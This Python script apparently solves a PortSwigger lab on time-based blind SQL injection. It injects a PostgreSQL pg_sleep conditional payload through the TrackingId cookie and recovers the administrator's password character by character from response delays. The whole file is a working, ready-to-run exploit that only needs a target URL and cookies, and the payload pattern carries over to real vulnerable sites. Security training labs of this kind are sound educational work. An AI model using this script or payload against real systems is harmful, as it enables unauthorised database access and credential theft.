"""Blind SQL injection with time delays and information retrieval.

Lab:  https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
DBMS: PostgreSQL (time-based, pg_sleep)
"""

import string
from urllib.parse import quote

import requests

alphabet = list(string.ascii_lowercase + string.digits)

# --- Fill these from your own live PortSwigger lab instance (Burp / DevTools) ---
# Lab instances are ephemeral, so these values expire. Replace before running:
url = ""  # e.g. "https://<id>.web-security-academy.net/"
tracking_id = ""  # value of the TrackingId cookie, e.g. "XXXXXXXXXXXXXXXX"
session_cookie = (
    ""  # value of the "session" cookie, e.g. "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
)

session = requests.session()
password = ""

THRESHOLD = 2.5  # seconds; payload uses pg_sleep(3), so 2.5 leaves a jitter margin


def is_slow(payload: str) -> bool:
    """Send the payload and report whether the response was delayed (condition TRUE)."""
    cookies = {
        "TrackingId": quote(payload, safe=""),
        "session": session_cookie,
    }
    response = session.get(url, cookies=cookies, timeout=10)
    return response.elapsed.total_seconds() >= THRESHOLD


for i in range(1, 50):
    is_found = False

    for char in alphabet:
        raw = f"{tracking_id}'||(SELECT CASE WHEN (SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

        # A single slow response may just be network jitter. Confirm the hit with
        # a second request; the `and` short-circuits, so the second only fires
        # when the first was already slow.
        if is_slow(raw) and is_slow(raw):
            password += char
            is_found = True
            print(f"The character at position {i} is: {char}")
            break

    if not is_found:
        print(f"No character found at position {i}. Stopping search.")
        break

print(f"The password is: {password}")
